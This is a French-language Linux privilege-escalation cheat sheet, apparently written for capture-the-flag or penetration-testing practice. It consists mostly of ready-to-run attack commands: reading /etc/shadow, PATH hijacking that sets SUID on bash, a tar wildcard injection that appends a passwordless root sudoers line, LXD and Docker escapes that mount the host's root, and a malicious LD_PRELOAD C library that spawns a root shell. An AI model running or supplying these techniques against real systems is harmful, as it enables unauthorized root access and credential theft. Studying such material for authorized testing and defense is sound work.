# Enumération

## Outils

- **LinEnum.sh** : https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
- **Linux Exploit Suggester 2** : https://github.com/jondonas/linux-exploit-suggester-2

## Commandes

```bash
hostname
cat /etc/issue
ps aux | grep root
ls -la /home/user
ls -l ~/.ssh
history
sudo -l
ifconfig
netstat
last
cat /etc/passwd
cat /etc/shadow
lsblk
find / -user test 2>/dev/null
find / -perm -u=s 2>/dev/null
id
uname -a
lscpu
df -h
cat /etc/hosts
env
sudo -V
```

## Recherche de fichiers et permissions

```bash
find / -type f \( -name "*.conf" -o -name "*.config" \) -exec ls -l {} \; 2>/dev/null
find / -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
getcap -r / 2>/dev/null
```

# NFS

## Machine victime

```bash
cat /etc/exports
```

## Machine attaquante

```bash
showmount -e <MACHINE_IP>
mkdir /tmp/sharefolder
sudo mount -o rw <MACHINE_IP>:/sharedfolder /tmp/sharefolder
```

# Suid / sudo / capabilities

Références : https://gtfobins.github.io/

# PSPY

- **Outil** : https://github.com/DominicBreuker/pspy
- **Usage** : Lister les processus sans être root (ex. voir les cronjobs)

# Path

```bash
echo $PATH
cd /tmp
echo "chmod u+s /bin/bash" > ls
chmod +x ls
export PATH=/tmp:$PATH
```

# Wildcard Exploitation

```bash
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

# Groupes et conteneurs

## LXD

```bash
unzip alpine.zip 
lxd init
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t host-root disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh
```

## Docker

```bash
docker run -v /root:/mnt -it ubuntu
```

# LD_PRELOAD Exploitation

## Vérifier les permissions

```bash
sudo -l
```

## Compiler une bibliothèque malveillante

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

## Exécuter avec LD_PRELOAD

```bash
sudo LD_PRELOAD=/tmp/root.so /usr/bin/openssl restart
```
